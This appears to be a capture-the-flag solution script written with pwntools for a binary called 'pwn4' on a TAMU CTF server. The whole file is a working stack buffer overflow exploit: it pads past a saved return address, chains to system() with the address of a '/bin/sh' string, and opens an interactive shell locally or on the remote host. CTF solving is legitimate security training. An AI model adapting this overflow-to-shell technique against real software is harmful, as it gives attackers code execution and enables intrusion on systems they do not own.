from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    bin_sh = 0x804a038
    system = 0x8048430
    buf = ''
    buf += 'A' * (0x1c + 4 - len(buf))
    buf += flat([system, bin_sh, bin_sh])
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'i386'
    connect = 'nc pwn.ctf.tamu.edu 4324'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./pwn4'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
